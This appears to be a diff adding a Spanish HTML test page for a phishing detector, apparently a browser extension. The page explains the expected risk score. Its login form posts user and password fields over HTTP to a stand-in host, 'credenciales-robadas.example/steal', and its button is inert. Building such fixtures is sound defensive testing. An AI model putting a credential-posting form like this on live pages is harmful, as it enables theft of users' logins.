@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><meta charset="UTF-8"><title>Prueba: formulario de login inseguro</title></head>
+<body style="font: 15px/1.5 system-ui, sans-serif; max-width: 700px; margin: 40px auto;">
+  <h1>🎣 Prueba: login inseguro</h1>
+  <p><b>Esperado:</b> contraseña por HTTP (+50) + login enviado a otro dominio (+35)
+     = 85 → banner naranja y notificación. <b>No hace falta enviar el formulario</b>:
+     la detección es al analizar el DOM.</p>
+  <hr>
+
+  <!-- Formulario con contraseña, en página HTTP, con action hacia otro dominio.
+       El dominio .example está reservado (RFC 2606): nunca resuelve. -->
+  <form action="http://credenciales-robadas.example/steal" method="post"
+        style="border: 1px solid #ccc; padding: 16px; border-radius: 8px; max-width: 320px;">
+    <h3>Iniciar sesión</h3>
+    <p><label>Usuario<br><input type="text" name="user"></label></p>
+    <p><label>Contraseña<br><input type="password" name="pass"></label></p>
+    <button type="button">Entrar (no hace nada)</button>
+  </form>
+
+  <p><a href="/index.html">← Volver al índice</a></p>
+</body>
+</html>
